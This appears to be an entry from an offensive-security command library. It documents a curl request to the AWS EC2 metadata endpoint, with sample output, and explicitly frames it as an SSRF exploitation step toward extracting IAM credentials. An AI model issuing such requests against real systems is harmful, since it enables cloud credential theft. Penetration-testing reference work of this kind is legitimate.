---
type: command
executor: bash
data: 'curl "http://169.254.169.254/latest/meta-data/"'
output: null
platforms:
  - AWS
tags:
  - ssrf
  - metadata
verified: true
validated: true
---

# curl-ec2-metadata-categories

## Command

```bash
curl "http://169.254.169.254/latest/meta-data/"
```

## Description

This command queries the AWS EC2 instance metadata service to list available metadata categories. It is used in SSRF exploitation to identify accessible paths like 'iam/' for credential extraction. Run from within the instance or simulate via SSRF payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; uses default metadata endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "http://169.254.169.254/latest/meta-data/"
```

### With Output Suppression (for scripting)

```bash
curl -s "http://169.254.169.254/latest/meta-data/" > metadata_categories.txt
```

## Expected Output

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id

## Related

- [[procedures/Exploit-AWS-EC2-Metadata-SSRF-for-Credential-Extraction]]
- [[commands/curl-ec2-iam-role-credentials]]
